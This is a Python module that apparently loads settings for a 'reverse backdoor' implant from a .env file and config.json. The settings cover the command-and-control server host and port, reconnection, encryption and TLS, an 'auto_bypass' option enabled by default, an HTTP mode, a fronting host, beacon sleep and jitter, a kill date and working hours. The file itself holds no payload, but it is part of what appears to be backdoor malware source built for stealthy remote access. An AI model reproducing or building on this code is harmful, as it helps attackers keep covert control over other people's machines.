import json
import os


def _load_dotenv():
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
    if not os.path.exists(env_path):
        return {}
    values = {}
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            key, _, val = line.partition('=')
            key, val = key.strip(), val.strip()
            if key and val:
                values[key] = val
    return values


def load_config():
    env = _load_dotenv()

    config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
    defaults = {}

    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        defaults.update(config)
    except Exception:
        pass

    server_host = env.get('REVERSE_BACKDOOR_SERVER_HOST') or defaults.get('server_host', '127.0.0.1')
    server_port = int(env.get('REVERSE_BACKDOOR_SERVER_PORT') or defaults.get('server_port', 5555))
    reconnect = int(env.get('REVERSE_BACKDOOR_RECONNECT_INTERVAL') or defaults.get('reconnect_interval', 5))
    encryption = env.get('REVERSE_BACKDOOR_ENCRYPTION', '').lower() == 'true'
    tls = env.get('REVERSE_BACKDOOR_TLS', '').lower() == 'true'
    auto_bypass = env.get('REVERSE_BACKDOOR_AUTO_BYPASS', 'true').lower() == 'true'
    http_mode = env.get('REVERSE_BACKDOOR_HTTP', '').lower() == 'true'
    front_host = env.get('REVERSE_BACKDOOR_FRONT_HOST') or None
    beacon_mode = env.get('REVERSE_BACKDOOR_BEACON', '').lower() == 'true' or defaults.get('beacon', False)
    beacon_sleep = float(env.get('REVERSE_BACKDOOR_BEACON_SLEEP') or defaults.get('beacon_sleep', 5.0))
    beacon_jitter = float(env.get('REVERSE_BACKDOOR_BEACON_JITTER') or defaults.get('beacon_jitter', 0.3))
    kill_date = env.get('REVERSE_BACKDOOR_KILL_DATE') or defaults.get('kill_date')
    working_hours = defaults.get('working_hours')

    return {
        'server_host': server_host,
        'server_port': server_port,
        'reconnect_interval': reconnect,
        'encryption': encryption,
        'tls': tls,
        'auto_bypass': auto_bypass,
        'http_mode': http_mode,
        'front_host': front_host,
        'beacon': beacon_mode,
        'beacon_sleep': beacon_sleep,
        'beacon_jitter': beacon_jitter,
        'kill_date': kill_date,
        'working_hours': working_hours,
    }
